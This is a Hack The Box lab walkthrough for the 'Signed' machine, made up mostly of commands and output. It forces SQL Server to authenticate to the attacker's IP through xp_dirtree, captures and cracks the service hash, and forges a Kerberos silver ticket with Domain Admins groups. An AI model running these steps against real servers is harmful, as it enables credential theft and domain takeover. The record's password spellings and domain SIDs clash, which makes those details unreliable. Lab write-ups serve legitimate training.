# HTB Labs - Signed

## Start

`As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH`

## NMAP scan

```
nmap -A 10.129.242.173 -o signed_nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 14:38 EST
Nmap scan report for 10.129.242.173
Host is up (0.044s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-15T19:35:32
|_Not valid after:  2056-01-15T19:35:32
|_ssl-date: 2026-01-15T19:38:48+00:00; -47s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: mean: -47s, deviation: 0s, median: -47s

TRACEROUTE (using port 1433/tcp)
HOP RTT      ADDRESS
1   55.27 ms 10.10.14.1
2   56.33 ms 10.129.242.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.97 seconds
```
Port:
`1433/tcp  open  ms-sql-s`

Machine:
`Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
FQDN = DC01.signed.htb`

## Pre-Auth Enumeration

This didnt work:

```
nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')

```

Local Auth
```
nxc mssql --local-auth 10.129.242.173 -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```

## SQL Post-Auth Enumeration

```
nxc mssql --local-auth 10.129.242.173 \
  -u scott -p 'Sm230#C5NatH' \
  -q "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.129.242.173  1433   DC01             is_sysadmin:0
```

Results:

sysadmin = 0  → xp_cmdshell cannot be enabled directly ***

Check xp_dirtree permissions

```
nxc mssql --local-auth signed \
  -u scott -p 'Sm230#C5NatH' \
  -q "SELECT * FROM fn_my_permissions('master..xp_dirtree','OBJECT');"
```

## Net-NTLMv2 Capture via Forced UNC Path

Create a share directory (attacker)

```
mkdir -p /tmp/smbshare
```

Run responder (with sudo)

```
sudo responder -I tun0
```

Trigger outbound auth from SQL Server:

```
nxc mssql --local-auth 10.129.242.173 \
  -u scott -p 'Sm230#C5NatH' \
  -q "EXEC master..xp_dirtree '\\\\10.10.14.129\\smbshare'"
```

`\\\\10.10.14.129\\smbshare` -> my ip

`local-auth 10.129.242.173` -> image 

<img width="947" height="659" alt="image" src="https://github.com/user-attachments/assets/eceb173d-cc4e-498d-9234-38a3061ac99b" />


Result:

<img width="935" height="135" alt="image" src="https://github.com/user-attachments/assets/db84a920-771b-4626-a3b6-98d5c7fb57b9" />

Responder:
```
SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:031d659682533089:812C4B6CFF97D161270BEEFDF2482292:01010000000000000089F2D22E86DC01251CADEF79DF670C0000000002000800410051003400380001001E00570049004E002D0045005800350039003200450049004F0053005100420004003400570049004E002D0045005800350039003200450049004F005300510042002E0041005100340038002E004C004F00430041004C000300140041005100340038002E004C004F00430041004C000500140041005100340038002E004C004F00430041004C00070008000089F2D22E86DC010600040002000000080030003000000000000000000000000030000078B13FCEE5ACBEE58FE551BC7545C9465148B3F7EA4A05E49BD8A798916FC0090A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000 
```

## Hash Cracking 

```
sudo nano hash.txt

mssqlsvc::SIGNED:031d659682533089:812C4B6CFF97D161270BEEFDF2482292:01010000000000000089F2D22E86DC01251CADEF79DF670C0000000002000800410051003400380001001E00570049004E002D0045005800350039003200450049004F0053005100420004003400570049004E002D0045005800350039003200450049004F005300510042002E0041005100340038002E004C004F00430041004C000300140041005100340038002E004C004F00430041004C000500140041005100340038002E004C004F00430041004C00070008000089F2D22E86DC010600040002000000080030003000000000000000000000000030000078B13FCEE5ACBEE58FE551BC7545C9465148B3F7EA4A05E49BD8A798916FC0090A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000

```

Crack with Hashcat (5600 = NetNTLMv2):

```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --username --status
```

Running into problems with Hashcat so used john instead:

```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --username --status --force -D 1
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

No devices found/left.

Started: Thu Jan 15 15:02:48 2026
Stopped: Thu Jan 15 15:02:48 2026

┌──(ClearLotus㉿kali)-[~/signed]
└─$ cp hash.txt john_hash.txt

┌──(ClearLotus㉿kali)-[~/signed]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
Created directory: /home/ClearLotus/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:03 DONE (2026-01-15 15:04) 0.2680g/s 1202Kp/s 1202Kc/s 1202KC/s purcitititya..puppys50
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably                        
Session completed.
```

`purPLE9795!@     (mssqlsvc)`



## Restart Here: 

```
impacket-mssqlclient 'SIGNED/mssqlsvc:purPLE9795!@'@10.129.242.173 -windows-auth
```

Command To check if the user has sysadmin rights

```
SELECT IS_SRVROLEMEMBER('sysadmin');

```


## NTHASH Dumping in MSSQL

Dump Nthash with command:

```
echo -n 'purPLE9795\!0' | iconv -f UTF-8 -t UTF-16LE | openssl md4
```

```
IT_RID=1105

MSSQLSVC_RID=1103

DOMSID=’S-1-5-21-4088429403-1159899800-2753317549′

Command:SELECT SUSER_SID('SIGNED\IT');

```

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, SUSER_SID(name) AS sid FROM sys.syslogins WHERE name LIKE 'SIGNED\%';
name                                                                          sid   
-------------------   -----------------------------------------------------------   
SIGNED\IT             b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   

SIGNED\Domain Users   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'   

SQL (SIGNED\mssqlsvc  guest@master)> 
```


<img width="747" height="506" alt="image" src="https://github.com/user-attachments/assets/5afc9a23-5571-450b-b4d2-bc8fc0a48917" />


## Silver Ticket 

```
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \                                                  
  -nthash d37d613913ad137c17b40b1bb6407f1d \
  -domain-sid S-1-5-21-267716869-584017176-3399940237 \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/dc01.signed.htb \
  -groups 512,1105,513 \
  -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache


```

```
export KRB5CCNAME=$(pwd)/mssqlsvc.ccache
```





## Foothold with MSSQLSVC

```
echo -n 'puPLE9795!' | iconv -f utf8 -t utf16le | openssl dgst -md4
```

```
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -nthash 1b5b8b031e041c8f9c25bee1778d11b9 \
  -domain-sid S-1-5-21-1394779446-3015841977-3591561457 \
  -domain SIGNED.HTB \
  -user MSSQLSVC \
  MSSQLSvc/DC01.signed.htb
```

`[*] Saving ticket in MSSQLSvc.DC01.signed.htb.ccache`

```
export KRB5CCNAME=MSSQLSvc.DC01.signed.htb.ccache
```

Add to /etc/hosts

```
10.129.242.173 DC01.signed.htb DC01 SIGNED.HTB
```

```
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -k -no-pass MSSQLSVC@10.129.242.173 -dc-ip 10.129.242.173
```

X These methods are giving trouble

Next:

```
echo -n 'puPLE9795!' | iconv -f utf8 -t utf16le | openssl dgst -md4
```

```
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -nthash 1b5b8b031e041c8f9c25bee1778d11b9 \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn mssqlsvc/dc01.signed.htb \
  -groups 512,1105,513 \
  -user-id 1103 \
  mssqlsvc
```

```
export KRB5CCNAME=mssqlsvc.ccache
```

```
klist
```

```
klist
Ticket cache: FILE:mssqlsvc.ccache
Default principal: mssqlsvc@SIGNED.HTB

Valid starting       Expires              Service principal
01/15/2026 15:27:27  01/13/2036 15:27:27  mssqlsvc/dc01.signed.htb@SIGNED.HTB
        renew until 01/13/2036 15:27:27
```

























